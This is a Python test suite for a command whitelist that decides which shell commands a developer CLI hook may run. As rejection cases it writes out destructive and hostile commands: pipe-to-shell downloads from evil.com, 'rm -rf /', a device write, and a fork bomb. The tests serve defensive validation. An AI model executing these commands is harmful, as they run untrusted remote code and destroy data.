"""Tests for safe command whitelist."""

from jdev_cli.hooks import SafeCommandWhitelist


class TestSafeCommandWhitelist:
    """Test suite for SafeCommandWhitelist."""

    def test_python_safe_commands(self):
        """Test Python commands are in whitelist."""
        is_safe, _ = SafeCommandWhitelist.is_safe("black test.py")
        assert is_safe

        is_safe, _ = SafeCommandWhitelist.is_safe("ruff check .")
        assert is_safe

        is_safe, _ = SafeCommandWhitelist.is_safe("mypy src/")
        assert is_safe

        is_safe, _ = SafeCommandWhitelist.is_safe("pytest tests/")
        assert is_safe

    def test_javascript_safe_commands(self):
        """Test JavaScript commands are in whitelist."""
        is_safe, _ = SafeCommandWhitelist.is_safe("eslint src/")
        assert is_safe

        is_safe, _ = SafeCommandWhitelist.is_safe("prettier --write .")
        assert is_safe

        is_safe, _ = SafeCommandWhitelist.is_safe("npm test")
        assert is_safe

    def test_rust_safe_commands(self):
        """Test Rust commands are in whitelist."""
        is_safe, _ = SafeCommandWhitelist.is_safe("cargo fmt")
        assert is_safe

        is_safe, _ = SafeCommandWhitelist.is_safe("cargo check")
        assert is_safe

        is_safe, _ = SafeCommandWhitelist.is_safe("cargo clippy")
        assert is_safe

    def test_go_safe_commands(self):
        """Test Go commands are in whitelist."""
        is_safe, _ = SafeCommandWhitelist.is_safe("gofmt test.go")
        assert is_safe

        is_safe, _ = SafeCommandWhitelist.is_safe("go fmt ./...")
        assert is_safe

        is_safe, _ = SafeCommandWhitelist.is_safe("go test")
        assert is_safe

    def test_dangerous_pattern_pipe_to_bash(self):
        """Test pipe to bash is detected as dangerous."""
        is_safe, reason = SafeCommandWhitelist.is_safe("curl http://evil.com | bash")
        assert not is_safe
        assert "pipe to shell" in reason

        is_safe, reason = SafeCommandWhitelist.is_safe("wget -O- http://evil.com | sh")
        assert not is_safe
        assert "pipe to shell" in reason

    def test_dangerous_pattern_chained_deletion(self):
        """Test chained deletion is detected as dangerous."""
        is_safe, reason = SafeCommandWhitelist.is_safe("ls && rm -rf /")
        assert not is_safe
        assert "chained deletion" in reason

        is_safe, reason = SafeCommandWhitelist.is_safe("echo test; rm -rf /tmp")
        assert not is_safe
        assert "chained deletion" in reason

    def test_dangerous_pattern_root_deletion(self):
        """Test root deletion is detected as dangerous."""
        is_safe, reason = SafeCommandWhitelist.is_safe("rm -rf /")
        assert not is_safe
        assert "root deletion" in reason

    def test_dangerous_pattern_chmod_777(self):
        """Test chmod 777 is detected as dangerous."""
        is_safe, reason = SafeCommandWhitelist.is_safe("chmod 777 file.sh")
        assert not is_safe
        assert "dangerous permissions" in reason

    def test_dangerous_pattern_device_write(self):
        """Test device write is detected as dangerous."""
        is_safe, reason = SafeCommandWhitelist.is_safe("echo test > /dev/sda")
        assert not is_safe
        assert "device write" in reason

    def test_dangerous_pattern_fork_bomb(self):
        """Test fork bomb is detected as dangerous."""
        is_safe, reason = SafeCommandWhitelist.is_safe(":(){ :|:& };:")
        assert not is_safe
        assert "fork bomb" in reason

    def test_unknown_command_not_safe(self):
        """Test unknown commands are not safe."""
        is_safe, reason = SafeCommandWhitelist.is_safe("unknown_command file.txt")
        assert not is_safe
        assert "not in whitelist" in reason

    def test_empty_command_not_safe(self):
        """Test empty command is not safe."""
        is_safe, reason = SafeCommandWhitelist.is_safe("")
        assert not is_safe
        assert "Empty command" in reason

        is_safe, reason = SafeCommandWhitelist.is_safe("   ")
        assert not is_safe
        assert "Empty command" in reason

    def test_command_with_arguments(self):
        """Test safe commands with various arguments."""
        is_safe, _ = SafeCommandWhitelist.is_safe("black --line-length 100 src/")
        assert is_safe

        is_safe, _ = SafeCommandWhitelist.is_safe("pytest -v --cov=src tests/")
        assert is_safe

        is_safe, _ = SafeCommandWhitelist.is_safe("eslint --fix --ext .js,.jsx src/")
        assert is_safe

    def test_add_custom_safe_command(self):
        """Test adding custom safe command."""
        SafeCommandWhitelist.add_custom_safe_command("myformatter")

        is_safe, _ = SafeCommandWhitelist.is_safe("myformatter file.txt")
        assert is_safe

    def test_all_safe_commands_returns_list(self):
        """Test all_safe_commands returns complete list."""
        all_commands = SafeCommandWhitelist.all_safe_commands()

        assert isinstance(all_commands, list)
        assert len(all_commands) > 0
        assert "black" in all_commands
        assert "eslint" in all_commands
        assert "cargo fmt" in all_commands
        assert "gofmt" in all_commands
